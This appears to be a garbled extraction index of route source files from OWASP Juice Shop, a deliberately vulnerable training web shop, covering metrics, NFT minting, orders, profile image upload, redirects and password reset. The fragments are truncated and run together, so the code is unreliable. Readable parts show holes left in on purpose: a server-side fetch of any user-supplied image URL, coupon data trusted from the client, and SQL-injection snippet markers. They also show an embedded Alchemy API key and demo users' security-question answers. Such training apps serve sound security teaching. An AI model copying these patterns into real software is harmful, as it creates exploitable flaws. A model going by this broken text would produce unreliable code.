omain')J12934@challen ... mI=' })() => { ... amI=' }{ retur ... amI=' }return  ... VvamI='req.bod ... VvamI='req.bod ... il.com''bjoern ... il.com'{ data: User }data: Userchallen ... n.id })() => { ... in.id }{ retur ... in.id }return  ... dmin.iduser.da ... dmin.idusers.admin.idusers.adminchallen ... m.id })() => { ... im.id }{ retur ... im.id }return  ... .jim.iduser.da ... .jim.idusers.jim.idusers.jimchallen ... r.id })() => { ... er.id }{ retur ... er.id }return  ... nder.iduser.da ... nder.idusers.bender.idusers.benderchallen ... s.id })() => { ... is.id }{ retur ... is.id }return  ... hris.iduser.da ... hris.idusers.chris.idusers.chrischallen ... unting'challen ... omain')user.da ... omain')'acc0un ... omain')user.da ... unting'user.data.roleUserMod ... }).thenUserMod ... ') } })UserModel.count{ where ... n') } }where:  ... ain') }{ email ... ain') }email:  ... omain')(count: ...       }count === 0throw n ... again')new Err ... again')'Unable ...  again'Unable to verify challenges! Try againP:/My Drive/Git/juice-shop/routes/memory.tsgetMemoriesmodule. ... dMemoryconst r ... \r\n    }record  ... \r\n    }req.body.captionimagePa ... ilename'assets ... ilenamereq.file?.filenamereq.fileconst m ... record)memory  ... record)await M ... record)MemoryM ... record)res.sta ... mory }){ statu ... emory }data: memorymodule. ... emoriesconst m ... del] })memorie ... del] })await M ... del] })MemoryM ... del] }){ inclu ... odel] }include: [UserModel][UserModel]res.sta ... ries }){ statu ... ories }data: memoriesP:/My Drive/Git/juice-shop/routes/metrics.ts Increment by one if solved, when not solved increment by 0. This ensures that even unsolved challenges are set to , instead of not being set at all// Incr ...  at allretrieveChallengesWithCodeSnippet'./vulnCodeSnippet''../lib/antiCheat''../lib/accuracy'Prometheus'prom-client'onFinished'on-finished'fileUploadsCountMetric'file_uploads_count''Total number of successful file uploads grouped by file type.'labelNames'file_type'fileUploadErrorsMetric'file_upload_errors''Total number of failed file uploads grouped by file type.'observeRequestMetricsMiddlewarehttpRequestsMetric'http_requests_count''Total HTTP request count grouped by status code.''status_code'}XX`observeFileUploadMetricsMiddlewaremimetype'user-agent''Prometheus''Content-Type''application.customMetricsPrefix'collectDefaultMetricssetDefaultLabelsversionMetricsGauge}_version_info``Release version of ${}.`'version''major''minor'challengeSolvedMetrics}_challenges_solved`'Number of solved challenges grouped by difficulty and category.''category'challengeTotalMetrics}_challenges_total`'Total number of challenges grouped by difficulty and category.'codingChallengesProgressMetrics}_coding_challenges_progress`'Number of coding challenges grouped by progression phase.''phase'cheatScoreMetrics}_cheat_score`'Overall probability that any hacking or coding challenges were solved by cheating.'accuracyMetrics}_coding_challenges_accuracy`'Overall accuracy while solving coding challenges grouped by phase.'orderMetrics}_orders_placed_total``Number of orders placed in ${userMetrics}_users_registered`'Number of registered users grouped by customer type.''type'userTotalMetrics}_users_registered_total`'Total number of registered users.'walletMetrics}_wallet_balance_total`'Total balance of all users\' digital wallets.'interactionsMetrics}_user_social_interactions`'Number of social interactions with users grouped by type.'majorminor/(?<major>\d+).(?<minor>\d+).(?<patch>\d+)/challengeStatuseschallengeCount':''Unable to retrieve and count such challenges. Please try again'orderCountreviewCount'standard'totalBalance'complaint''Error during metrics update loop: + './vulnCodeSnippet/vulnCodeSnippetretriev ... Snippet../lib/antiCheat/lib/antiCheat../lib/accuracy/lib/accuracy* as Prometheusimport  ... nished'const r ... egisterregiste ... egisterPrometheus.registerconst f ... e']\r\n})fileUpl ... e']\r\n})fileUpl ... tMetricnew Pro ... e']\r\n})Prometheus.Counter{\r\n  na ... pe']\r\n}name: ' ... _count'file_uploads_counthelp: ' ...  type.''Total  ...  type.'Total number of successful file uploads grouped by file type.Total number of successful file uploads grouped by file typelabelNa ... _type']['file_type']file_typefileUpl ... sMetricname: ' ... errors'file_upload_errorsTotal number of failed file uploads grouped by file type.Total number of failed file uploads grouped by file typeexports ... \n  }\r\n}exports ... dlewareobserve ... dlewareconst h ... ]\r\n  })httpReq ... ]\r\n  })new Pro ... ]\r\n  }){\r\n     ... ']\r\n  }'http_r ... _count'http_requests_counthelp: ' ...  code.''Total  ...  code.'Total HTTP request count grouped by status code.Total HTTP request count grouped by status codelabelNa ... _code']['status_code']status_codereturn  ... ()\r\n  }(req: R ... ()\r\n  }onFinis ... \n    })const s ... 00)}XX`statusC ... 00)}XX``${Math ... 00)}XX`Math.fl ...  / 100)res.statusCode / 100XXhttpReq ... ).inc()httpReq ... de).inchttpReq ... usCode)httpReq ... .labels({ file ... ()\r\n  }res.sta ... ).inc()fileUpl ... ).inc()fileUpl ... pe).incfileUpl ... metype)fileUpl ... .labelsfile.mimetypeexports.serveMetricsasync ( ... ))\r\n  }const u ... ] ?? ''userAge ... ] ?? ''req.hea ... ] ?? ''req.hea ... agent']user-agentreturn  ... theus')!userAg ... theus')userAge ... theus')userAgent.includesres.set ... ntType)res.setContent-Typeregister.contentTyperes.end ... rics())res.endawait r ... trics()register.metrics()register.metricsexports ... Metricsconst a ... refix')app = c ... refix')config. ... refix')'applic ... Prefix'application.customMetricsPrefixPrometh ... ics({})Prometh ... Metricscollect ... Metricsregiste ...  app })registe ... tLabels{ app }const v ... ]\r\n  })version ... ]\r\n  })Prometheus.Gaugename: ` ... n_info``${app} ... n_info`_version_infohelp: ` ... me')}.``Releas ... me')}.`Release version of labelNa ... patch']['versi ... patch']const c ... ]\r\n  })challen ... ]\r\n  })challen ... Metricsname: ` ... solved``${app} ... solved`_challenges_solvedhelp: ' ... egory.''Number ... egory.'Number of solved challenges grouped by difficulty and category.Number of solved challenges grouped by difficulty and categorylabelNa ... egory']['diffi ... egory']name: ` ... _total``${app} ... _total`_challenges_total'Total  ... egory.'Total number of challenges grouped by difficulty and category.Total number of challenges grouped by difficulty and categorycodingC ... ]\r\n  })codingC ... Metricsname: ` ... ogress``${app} ... ogress`_coding ... rogress_coding_challenges_progresshelp: ' ... phase.''Number ... phase.'Number of coding challenges grouped by progression phase.Number of coding challenges grouped by progression phaselabelNa ... phase']['phase']const c ... '\r\n  })cheatSc ... '\r\n  })new Pro ... '\r\n  }){\r\n     ... .'\r\n  }name: ` ... _score``${app}_cheat_score`_cheat_scorehelp: ' ... ating.''Overal ... ating.'Overall probability that any hacking or coding challenges were solved by cheating.Overall probability that any hacking or coding challenges were solved by cheatingconst a ... ]\r\n  })accurac ... ]\r\n  })name: ` ... curacy``${app} ... curacy`_coding ... ccuracy_coding_challenges_accuracy'Overal ... phase.'Overall accuracy while solving coding challenges grouped by phase.Overall accuracy while solving coding challenges grouped by phaseconst o ... `\r\n  })orderMe ... `\r\n  })new Pro ... `\r\n  }){\r\n     ... .`\r\n  }_orders_placed_total`Number ... me')}.`Number  ... ced in Number of orders placed in const u ... ]\r\n  })userMet ... ]\r\n  })name: ` ... stered``${app} ... stered`_users_registered'Number ...  type.'Number of registered users grouped by customer type.Number of registered users grouped by customer typelabelNames: ['type']['type']const u ... '\r\n  })userTot ... '\r\n  })_users_ ... d_total_users_registered_totalhelp: ' ... users.''Total  ... users.'Total number of registered users.Total number of registered usersconst w ... '\r\n  })walletM ... '\r\n  })_wallet ... e_total_wallet_balance_totalhelp: ' ... llets.''Total  ... llets.'Total balance of all users' digital wallets.Total balance of all users' digital walletsconst i ... ]\r\n  })interac ... ]\r\n  })name: ` ... ctions``${app} ... ctions`_user_s ... actions_user_social_interactionsNumber of social interactions with users grouped by type.Number of social interactions with users grouped by typeconst u ... , 5000)updateL ... , 5000)() => s ... , 5000)setInte ... , 5000)const v ... rsion()const { ... .groups{ major ... .groups{ major ... patch }version ... .groupsversion ... >\d+)/)version.match/(?<maj ... h>\d+)/(?<major>\d+).(?<minor>\d+).(?<patch>\d+)(?<major>\d+)(?<minor>\d+)(?<patch>\d+)version ... h }, 1)versionMetrics.set{ versi ... patch }const c ... w Map()challen ... w Map()new Map()Object. ... lenges)const { ... olved }{ diffi ... olved }const k ... egory}`key = ` ... egory}``${diff ... egory}`challen ... 1 : 0))challen ... ses.set(challe ...  1 : 0)(challe ... ) || 0)challen ... y) || 0challen ... et(key)challen ... ses.get(solved ? 1 : 0)solved ? 1 : 0challen ... 0) + 1)challengeCount.set(challe ...  0) + 1challengeCount.getchallen ... .keys()challen ... es.keysconst [ ... ':', 2)[diffic ... ':', 2)[diffic ... tegory]key.split(':', 2)key.splitchallen ... t(key))challen ... ics.set{ diffi ... egory }void re ...      })retriev ...      })retriev ... ().thenretriev ... ippet()Challen ... ).catchChallen ... }).thenChallengeModel.countcodingC ... q]: 1 }{ [Op.eq]: 1 }[Op.eq]: 1Op.eqcodingC ...  count)codingC ... ics.set{ phase: 'find it' }Unable to retrieve and count such challenges. Please try againUnable to retrieve and count such challengescodingC ... q]: 2 }{ [Op.eq]: 2 }[Op.eq]: 2{ phase: 'fix it' }(_: unk ...       }{ where ... 0 } } }where:  ... : 0 } }{ codin ... : 0 } }codingC ... e]: 0 }{ [Op.ne]: 0 }[Op.ne]: 0Op.ne{ phase ... lved' }phase: 'unsolved'challen ... - countchallenges.lengthcheatSc ... core())cheatSc ... ics.setaccurac ... racy())accuracyMetrics.setaccurac ... uracy()ordersC ... }).thenordersC ... unt({})ordersC ... n.count(orderC ...       }if (ord ... rCount)orderMe ... rCount)orderMetrics.setreviews ... unt({})reviews ... n.countif (rev ... wCount)interac ... wCount)interac ... ics.set{ type: 'review' }type: 'review'void Us ...      })UserMod ...  } } }){ where ... ' } } }where:  ... er' } }{ role: ... er' } }role: { ... omer' }{ [Op.e ... omer' }[Op.eq]: 'customer'if (cou ...  count)userMet ...  count)userMetrics.set{ type: 'standard' }type: 'standard'where:  ... xe' } }{ role: ... xe' } }role: { ... luxe' }{ [Op.e ... luxe' }[Op.eq]: 'deluxe'{ type: 'deluxe' }type: 'deluxe'UserMod ... ().thenUserModel.count()if (cou ... (count)userTot ... (count)userTotalMetrics.setvoid Wa ...      })WalletM ... ').thenWalletM ... lance')WalletModel.sum(totalB ...       }if (tot ... alance)walletM ... alance)walletMetrics.setvoid Fe ...      })Feedbac ...      })Feedbac ... ().thenFeedbac ... count()FeedbackModel.countinterac ...  count){ type: 'feedback' }type: 'feedback'void Co ...      })Complai ...      })Complai ... ().thenComplai ... count()ComplaintModel.count{ type: ... aint' }type: 'complaint'logger. ... age(e))'Error  ... sage(e)'Error  ... op: + 'Error during metrics update loop: + utils.g ... sage(e)return  ... op\r\n  }{\r\n     ... op\r\n  }P:/My Drive/Git/juice-shop/routes/nftMint.ts'../data/static/contractABIs'addressesMintedisEventListenerCreatedWebSocketProvider'wss://eth-sepolia.g.alchemy.com/v2/FZDapFZSs1l6yhHW4VnQqsi18qSd-3GJ'minter'Event Listener Created'walletNFTVerify'Wallet did not mint the NFT'const n ... .nftABInftABI  ... .nftABIrequire ... .nftABIrequire ... tABIs')'../dat ... ctABIs'../data/static/contractABIs/data/static/contractABIsconst e ... thers')ethers  ... thers')require('ethers')const a ... w Set()address ... w Set()new Set()let isE ... = falseisEvent ... = falseisEvent ... Createdconst p ... d-3GJ')provide ... d-3GJ')new eth ... d-3GJ')'wss:// ... Sd-3GJ'wss://eth-sepolia.g.alchemy.com/v2/FZDapFZSs1l6yhHW4VnQqsi18qSd-3GJwss://eth-sepoliacom/v2/FZDapFZSs1l6yhHW4VnQqsi18qSd-3GJconst c ... ovider)contrac ... ovider)new eth ... ovider)!isEven ... Createdcontract.on(minter ...       }if (!ad ...       }!addres ... minter)address ... minter)addressesMinted.hasaddressesMinted.addisEvent ...  = true{ succe ... ated' }message ... reated''Event  ... reated'Event Listener Createdmodule. ... TVerifyconst m ... Addressmetamas ... Addressreq.bod ... Addressif (add ...       }address ... ddress)address ... .deletechallen ... > true)message ... he NFT''Wallet ... he NFT'Wallet did not mint the NFTP:/My Drive/Git/juice-shop/routes/order.tsPDFDocument'pdfkit'pdfFile`order_${docfileWriter'finish''Times-Roman'115540moveDown'Order Confirmation''Customer''left''Order'} #: ${'Date'basketProductstotalPointsitemPriceitemBonus}x ${'ea.'} = ${calculateApplicableDiscountdiscountAmount'% discount from coupon: -'''deliveryMethoddeliveryMethodFromModeldeliveryAmount'Delivery Price''Helvetica-Bold''Total Price''Bonus Points Earned'`(${'The bonus points from this order will be added 1:1 to your wallet -fund for future purchases!''Thank you for your order!''Insufficient wallet balance.'increment`Basket with id=${} does not exist.`80'base64'couponDatekeyof'Mar 08, 2019 00:00:00 GMT+0100''Mar 08, 2020 00:00:00 GMT+0100''Mar 08, 2021 00:00:00 GMT+0100''Mar 08, 2022 00:00:00 GMT+0100''Mar 08, 2023 00:00:00 GMT+0100''May 04, 2020 00:00:00 GMT+0100''May 04, 2021 00:00:00 GMT+0100''May 04, 2022 00:00:00 GMT+0100''May 04, 2023 00:00:00 GMT+0100'const P ... dfkit')PDFDocu ... dfkit')require('pdfkit')id?: numberconst c ... om(req)custome ... om(req)const e ... '' : ''email = ... '' : ''custome ... '' : ''custome ... il : ''customer.datacustomer.data.emailconst o ... ing(16)const p ... d}.pdf`pdfFile ... d}.pdf``order_ ... d}.pdf`order_const d ... ument()doc = n ... ument()new PDFDocument()const d ... (0, 10)date =  ... (0, 10)new Dat ... (0, 10)new Dat ... ).slicenew Date().toJSON()new Date().toJSONconst f ... File)))fileWri ... File)))doc.pip ... File)))doc.pipefs.crea ... fFile))path.jo ... dfFile)fileWri ...      })fileWriter.onvoid ba ... null })basket. ... null }){ coupon: null }coupon: nullawait B ... id } })BasketI ... destroy{ BasketId: id }BasketId: idres.jso ... erId })orderCo ... orderIddoc.fon ... ter' })doc.fon ... 0).textdoc.fon ... n', 40)doc.fontTimes-Roman{ align: 'center' }align: 'center'doc.mov ... troke()doc.mov ... .strokedoc.mov ... 0, 115)doc.mov ... .lineTodoc.moveTo(70, 115)doc.moveTodoc.mov ... 0, 120)doc.moveTo(70, 120)doc.fon ... eDown()doc.fon ... oveDowndoc.fontSize(20)doc.fontSizedoc.fon ... n', 20)req.__( ... ation')Order Confirmationdoc.fon ... eft' })doc.fon ... 5).textdoc.fon ... n', 15)`${req. ... email}`req.__('Customer')Customer{ align: 'left' }align: 'left'`${req. ... derId}`req.__('Order') #: doc.moveDown()doc.moveDown`${req. ... {date}`req.__('Date')let totalPrice = 0totalPrice = 0const b ... [] = []basketP ... [] = []let totalPoints = 0totalPoints = 0({ Bask ...       }{ Baske ... e, id }if (Bas ...       }BasketItem != nullchallen ... l.id })() => { ... al.id }{ retur ... al.id }return  ... cial.idBasketI ... cial.idBasketItem.ProductIdproduct ... cial.idproduct ... SpecialQuantit ... }).thenQuantit ... Id } }){ Produ ... uctId }Product ... oductIdconst n ... uantityBasketItem.quantityQuantityModel.updateBasketI ... oductIdlet ite ...  numberitemPrice: numberitemPri ... xePriceitemPrice = priceconst i ... uantityitemPri ... uantityitemBon ... uantityitemPrice / 10const p ...       }name: req.__(name)req.__(name)price: itemPricetotal: itemTotalbonus: itemBonusbasketP ... roduct)basketProducts.pushdoc.tex ... tal}\u00a4`)doc.text`${Bask ... otal}\u00a4`req.__('ea.')ea.ea = totalPr ... emTotaltotalPo ... emBonusconst d ... t, req)discoun ... t, req)calcula ... t, req)calcula ... iscountlet dis ... t = '0'discountAmount = '0'discount > 0discoun ... ixed(2)(totalP ... ixed(2)(totalP ... toFixed(totalP ... / 100))totalPr ...  / 100)(discount / 100)discount / 100doc.tex ...  + '\u00a4')discoun ... t + '\u00a4'discoun ... tAmountdiscoun ... pon: -''% disc ... pon: -'% discount from coupon: -'\u00a4'totalPr ... Amount)const d ...       }deliver ...       }deluxePrice: 0price: 0eta: 5req.bod ... ethodIdreq.bod ... Detailsconst d ... Id } })deliver ... Id } })deliver ... omModelawait D ... Id } })Deliver ... Id } }){ where ... dId } }where:  ... hodId }{ id: r ... hodId }id: req ... ethodIdif (del ...       }deliver ... != nulldeliver ... xePricedeliver ... l.pricedeliveryMethod.pricedeliver ... del.etadeliveryMethod.etatotalPr ... yAmountdoc.tex ... (2)}\u00a4`)`${req. ... d(2)}\u00a4`req.__( ... Price')Delivery Pricedoc.fon ... (2)}\u00a4`)doc.fon ... d', 20)Helvetica-BoldTotal PricetotalPrice.toFixeddoc.fon ... ints}`)doc.fon ... d', 15)`${req. ... oints}`req.__( ... arned')'Bonus  ... Earned'Bonus Points Earneddoc.fon ... s!')}`)`(${req ... es!')}`req.__( ... ases!')'The bo ... hases!'The bonus points from this order will be added 1:1 to your wallet -fund for future purchases!doc.fon ... der!'))req.__( ... rder!')'Thank  ... order!'Thank you for your order!challen ...  < 0 })() => { ... e < 0 }{ retur ... e < 0 }return  ... ice < 0totalPrice < 0req.bod ... ymentId(wallet ... alPricewallet. ... alPrice{ balan ... Price }balance: totalPricenext(ne ... nce.'))new Err ... ance.')'Insuff ... lance.'Insufficient wallet balance.Insufficient wallet balance{ balan ... oints }balance: totalPointsdb.orde ... .insertpromoti ... tAmountpayment ...  : nullreq.bod ...  : nullreq.bod ... dressId(email  ... efined)email ? ... definedbonus: totalPointsdeliver ... yAmounteta: de ... tring()deliver ... tring()deliver ... oStringdoc.end()doc.endnext(ne ... ist.`))new Err ... xist.`)`Basket ... exist.`functio ... rn 0\r\n}{\r\n  if ... rn 0\r\n}if (sec ...  }\r\n  }basket.couponchallen ... = 80 })() => { ... >= 80 }{ retur ... >= 80 }return  ... t >= 80discount >= 80return discountif (req ...  }\r\n  }req.body.couponDataconst c ... it('-')couponD ... it('-')Buffer. ... it('-')Buffer. ... ).splitBuffer. ... tring()Buffer. ... oStringBuffer. ... ase64')base64const c ... Data[0]couponC ... Data[0]couponData[0]const c ... ata[1])couponD ... ata[1])Number( ... ata[1])couponData[1]const c ... paigns]campaig ... paigns]couponC ... mpaignskeyof t ... mpaignstypeof campaignscampaig ... validOncouponD ... validOnchallen ... me() })() => { ... ime() }{ retur ... ime() }return  ... tTime()campaig ... tTime()return  ... iscountconst c ... 40 }\r\n}campaig ... 40 }\r\n}{\r\n  WM ... 40 }\r\n}validOn ... tTime()new Dat ... +0100')'Mar 08 ... T+0100'Mar 08, 2019 00:00:00 GMT+0100Mar 08, 2019 00:00:00 GMT+0100Mar 08, 2020 00:00:00 GMT+0100Mar 08, 2020 00:00:00 GMMar 08, 2021 00:00:00 GMT+0100Mar 08, 2021 00:00:00 GMMar 08, 2022 00:00:00 GMT+0100Mar 08, 2022 00:00:00 GMMar 08, 2023 00:00:00 GMT+0100Mar 08, 2023 00:00:00 GM'May 04 ... T+0100'May 04, 2020 00:00:00 GMT+0100May 04, 2020 00:00:00 GMMay 04, 2021 00:00:00 GMT+0100May 04, 2021 00:00:00 GMMay 04, 2022 00:00:00 GMT+0100May 04, 2022 00:00:00 GMMay 04, 2023 00:00:00 GMT+0100May 04, 2023 00:00:00 GMP:/My Drive/Git/juice-shop/routes/orderHistory.tsorderHistoryallOrdersmodule. ... Historyconst o ... mail })order = ... mail })await o ... mail })ordersC ... mail })ordersC ... on.findres.sta ... rder }){ statu ... order }data: ordermodule. ... lOrdersconst o ... .find()order = ... .find()await o ... .find()ordersC ... .find()res.sta ... se() }){ statu ... rse() }data: o ... verse()order.reverse()order.reversemodule. ... yStatusconst d ... yStatusdeliver ... yStatus!req.bo ... yStatusreq.bod ... yStatusconst e ... ' : '1'eta = d ... ' : '1'deliver ... ' : '1'await o ... ta } })ordersC ... ta } })ordersC ... .update{ _id:  ... ms.id }_id: req.params.id{ $set: ... eta } }$set: { ... , eta }{ deliv ... , eta }P:/My Drive/Git/juice-shop/routes/payment.tsdisplayCarddisplayableCardsdisplayableCardcardNumber'Card deleted successfully.'UserId: numbercardNum: stringdisplay ... [] = []displayCard[]cards = ... Id } })CardModel.findAllcards.f ... \n    })cards.forEachcard => ... \r\n    }display ...       }UserId: card.UserIdcard.UserIdid: card.idcard.idcardNum: ''const c ... ardNum)display ... th - 4)display ... cardNum'*'.rep ... th - 4)'*'.repeat(12)'*'.repeatcardNum ... th - 4)cardNumber.substringcardNum ... gth - 4cardNumber.lengthdisplay ... leCard)display ... ds.pushres.sta ... ards }){ statu ... Cards }data: d ... leCardsmodule. ... hodByIddisplay ... \r\n    }UserId: 0id: 0fullName: ''expMonth: 0expYear: 0if (car ... \r\n    }display ... .UserIddisplay ... card.iddisplayableCard.iddisplay ... ullNamedisplay ... xpMonthdisplay ... expYear(card ! ... bleCard(card != null)res.sta ... Card }){ statu ... eCard }data: d ... bleCard{ statu ... cted' }data: ' ... tected'CardModel.destroy'Card d ... fully.'Card deleted successfully.Card deleted successfullyP:/My Drive/Git/juice-shop/routes/premiumReward.tsservePremiumContent'frontend/dist/frontend/assets/private/JuiceShop_Wallpaper_1920x1080_VR.jpg'res.sen ... .jpg'))path.re ... R.jpg')'fronte ... VR.jpg'frontend/dist/frontend/assets/private/JuiceShop_Wallpaper_1920x1080_VR.jpgfrontend/dist/frontend/assets/private/JuiceShop_Wallpaper_1920x1080_VRP:/My Drive/Git/juice-shop/routes/privacyPolicyProof.tsservePrivacyPolicyProof'frontend/dist/frontend/assets/private/thank-you.jpg'servePr ... cyProofpath.re ... u.jpg')'fronte ... ou.jpg'frontend/dist/frontend/assets/private/thank-you.jpgfrontend/dist/frontend/assets/private/thank-youP:/My Drive/Git/juice-shop/routes/profileImageFileUpload.ts @ts-expect-error FIXME buffer has unexpected type// @ts- ... ed type'file-type'fileUploaduploadedFileTypefromBuffer'Illegal file type'mime`frontend/dist/frontend/assets/public/images/uploads/${}.${'Error opening file: ''Error writing file: '415`Profile image upload does not accept this file type${const f ... -type')fileTyp ... -type')require('file-type')const f ... eq.filefile = req.fileconst u ... buffer)uploade ... buffer)await f ... buffer)fileTyp ... buffer)fileType.fromBufferif (upl ... \r\n    }uploade ... definednext(ne ... type'))Illegal file typeif (upl ...       }uploade ... image')uploade ... == nullutils.s ... image')uploade ... pe.mime`fronte ... e.ext}`fronten ... ploads/uploadedFileType.extif (err ... essage)logger. ... essage)'Error  ... message'Error  ... file: 'Error opening file: Error writing file: fs.clos ... () { })function () { }return  ... xt}` })await u ... xt}` })user.up ... xt}` }){ profi ... ext}` }profile ... e.ext}``assets ... e.ext}`res.loc ... ofile')res.locationprocess ... rofile'res.red ... ofile')res.redirectres.status(415)next(ne ... '.'}`))new Err ...  '.'}`)`Profil ... : '.'}`Profile ... le typeProfile image upload does not accept this file typeuploade ... ) : '.'(': ' + ... e.mime)': ' +  ... pe.mimeP:/My Drive/Git/juice-shop/routes/profileImageUrlUpload.tsprofileImageUrlUpload/(.)*solve\/challenges\/server-side(.)*/abused_ssrf_bugimageRequest`Error retrieving user profile image: ${}; using image link directly`'jpg''jpeg''png''svg''gif'`/assets/public/images/uploads/${request ... quest')require('request')profile ... lUploadreturn  ... ')\r\n  }(req: R ... ')\r\n  }req.body.imageUrlconst u ... mageUrlurl = r ... mageUrlif (url ...  = trueurl.mat ... == nullurl.mat ... e(.)*/)url.match/(.)*so ... de(.)*/(.)*solve\/challenges\/server-side(.)*(.)*(.)server-sidereq.app ...  = truereq.app ... srf_bugconst i ...      })imageRe ...      })request ...      })request ...     .onrequest ... et(url)request ...    .getUserMod ... ror) })UserMod ... l }) })async ( ... rl }) }{ retur ... rl }) }await u ...  url })user?.u ...  url })user?.update{ profi ... : url }profileImage: url(error: ... rror) }{ next(error) }logger. ... ectly`)`Error  ... rectly`Error r ... image: Error retrieving user profile image: ; using ... irectly; using image link directlyif (res ... ror) })res.sta ... === 200const e ... : 'jpg'ext = [ ... : 'jpg'['jpg', ... : 'jpg'['jpg', ... Case())['jpg', ... ncludes['jpg', ...  'gif']jpeggifurl.spl ... rCase()url.spl ... werCaseurl.spl ... (-1)[0]url.spl ... ice(-1)url.split('.').sliceurl.split('.')imageRe ... ext}`))imageRequest.pipefs.crea ... {ext}`)`fronte ... ${ext}`UserMod ... ` }) })async ( ... }` }) }{ retur ... }` }) }user?.u ... xt}` })profile ... ${ext}``/asset ... ${ext}`/assets ... ploads//assets/public/images/uploads/P:/My Drive/Git/juice-shop/routes/quarantineServer.tsserveQuarantineFiles'ftp/quarantine/'ftp/quarantine/P:/My Drive/Git/juice-shop/routes/recycles.ts'Error fetching recycled items. Please try again'errMsg'Sorry, this endpoint is not supported.'exports ...   })\r\n}exports ... cleItem{\r\n  Re ...   })\r\n}Recycle ... }).thenRecycleModel.findAllid: JSO ... ams.id)JSON.pa ... ams.id)(Recycl ... ))\r\n  }return  ... cycle))res.sen ... cycle))utils.q ... ecycle)(_: unk ... ')\r\n  }return  ... again')res.sen ... again')'Error  ...  again'Error fetching recycled items. Please try againError fetching recycled itemsexports ... sg))\r\n}exports ... leItems() => ( ... sg))\r\n}(req: R ... sg))\r\n}{\r\n  co ... sg))\r\n}const e ... ted.' }errMsg  ... ted.' }{ err:  ... ted.' }err: 'S ... orted.''Sorry, ... orted.'Sorry, this endpoint is not supported.Sorry, this endpoint is not supportedreturn  ... rrMsg))res.sen ... rrMsg))utils.q ... errMsg)P:/My Drive/Git/juice-shop/routes/redirect.tsperformRedirecttoUrlisUnintendedRedirect406'Unrecognized target URL for redirect: 'unintendedimport  ... utils')require ... utils'){ query }const t ...  stringtoUrl:  ...  stringquery.to as stringquery.tosecurit ... (toUrl)challen ... ae6' })() => { ... eae6' }{ retur ... eae6' }return  ... 11eae6'toUrl = ... 11eae6'toUrl = ... G8DRZm'toUrl = ... ZN17kW'challen ... Url) })() => { ... oUrl) }{ retur ... oUrl) }return  ... (toUrl)isUnint ... (toUrl)res.redirect(toUrl)res.status(406)next(ne ... toUrl))new Err ...  toUrl)'Unreco ... + toUrl'Unreco ... rect: 'Unrecognized target URL for redirect: functio ... nded\r\n}{\r\n  le ... nded\r\n}let uni ...  = trueunintended = truesecurit ... lowlistuninten ... wedUrl)!utils. ... wedUrl)utils.s ... wedUrl)return unintendedP:/My Drive/Git/juice-shop/routes/repeatNotification.tssendStatusreturn  ... 0)\r\n  }({ quer ... 0)\r\n  }const c ... string)challen ... string)decodeU ... string)query.c ...  stringquery.challengeconst c ... geName)challen ... eByNamechallenge?.solvedchallen ... , true)res.sendStatus(200)res.sendStatusP:/My Drive/Git/juice-shop/routes/resetPassword.tsverifySecurityAnswerChallenges'Wrong answer to security question.''Stop\'n\'Drop''Silence of the Lambs'{ body, connection }const e ... y.emailemail = body.emailbody.emailconst a ... .answeranswer = body.answerbody.answerconst n ... ody.newnewPass ... ody.newbody.newbody.repeatif (!em ... \r\n    }!email || !answer!email!answerSecurit ...      })Securit ... }).thenSecurit ...  | nullif ((da ...       }(data ! ... .answer(data != null)data != nulldata.answerUserMod ... UserId)user?.u ...      })user?.u ... ).catchuser?.u ... }).thenuser?.u ... word }){ passw ... sword }verifyS ... answer)verifyS ... llengesres.sta ... ion.'))res.__( ... tion.')'Wrong  ... stion.'Wrong answer to security question.Wrong answer to security questionchallen ... uel' })() => { ... muel' }{ retur ... muel' }return  ... Samuel'user.id ... Samuel'user.id ... .jim.idanswer === 'Samuel'challen ... rop' })() => { ... Drop' }{ retur ... Drop' }return  ... \'Drop'user.id ... \'Drop'user.id ... nder.idanswer  ... \'Drop'challen ... 082' })() => { ... 2082' }{ retur ... 2082' }return  ... t-2082'user.id ... t-2082'user.id ... oern.idusers.bjoern.idusers.bjoernanswer  ... t-2082'challen ... 41L' })() => { ... b41L' }{ retur ... b41L' }return  ... 0wb41L'user.id ... 0wb41L'user.id ... orty.idusers.morty.idusers.mortyanswer  ... 0wb41L'challen ... aya' })() => { ... Zaya' }{ retur ... Zaya' }return  ...  'Zaya'user.id ...  'Zaya'user.id ... wasp.idusers.bjoernOwasp.idusers.bjoernOwaspanswer === 'Zaya'challen ... mbs' })() => { ... ambs' }{ retur ... ambs' }return  ...  Lambs'user.id ...  Lambs'user.id ... ogin.idusers.uvogin.idusers.uvoginanswer  ...  Lambs'challen ... r\r\n  })() => { ... er\r\n  }const s ...   })())securit ...   })())((() => ...   })())(() =>  ...    })()(() =>  ... \n    })const m ... ories')i < memories.lengthmemorie ... yAnswermemories[i]return  ... yAnsweruser.id ... yAnsweruser.id ... john.idusers.john.idusers.johnanswer  ... yAnsweruser.id ... emma.idusers.emma.idusers.emmaP:/My Drive/Git/juice-shop/routes/restoreProgress.ts999' solved challenges have been restored.''Invalid continue code.'idsFindItidsFixItmodule. ... rogressconst c ... nueCodecontinu ... nueCodeparams.continueCodeconst i ... ueCode)ids = h ... ueCode)hashids ... ueCode)hashids.decodechallen ... es(999)ids.includes(999)ids.includesres.end()if (ids ... \r\n    }if (ids ...       }ids.inc ... me].id)res.jso ... ed.' }){ data: ... red.' }data: i ... tored.'ids.len ... tored.'' solve ... tored.' solved challenges have been restored.res.sta ... code.')'Invali ...  code.'Invalid continue code.Invalid continue codemodule. ... sFindItconst i ... FindIt)idsFind ... FindIt)hashids ... FindIt)idsFindIt.length > 0idsFindIt.lengthObject. ... s, key)idsFind ... ey].id)idsFindIt.includeschallenges[key].idawait c ... , true)idsFind ... tored.'module. ... ssFixItconst i ... eFixIt)idsFixI ... eFixIt)hashids ... eFixIt)idsFixIt.length > 0idsFixIt.lengthidsFixI ... ey].id)idsFixIt.includeschallen ... veFixItidsFixI ... tored.'P:/My Drive/Git/juice-shop/routes/saveLoginIp.ts @ts-expect-error FIXME types not matching// @ts- ... atchingsaveLoginIp'true-client-ip'const l ... om(req)loggedI ... om(req)loggedI ... definedlet las ... nt-ip']lastLog ... nt-ip']req.hea ... nt-ip']true-client-ipchallen ... )">' })() => { ... `)">' }{ retur ... `)">' }return  ... ss`)">'lastLog ... ss`)">'lastLog ... oginIp)securit ... oginIp)if (las ...       }lastLog ... definedlastLog ... ddress)utils.t ... ddress)utils.t ... Addressuser?.u ... ng() }){ lastL ... ing() }lastLog ... tring()lastLog ... oStringres.json(user)res.sendStatus(401)P:/My Drive/Git/juice-shop/routes/search.ts vuln-code-snippet start unionSqlInjectionChallenge dbSchemaChallenge vuln-code-snippet vuln-line 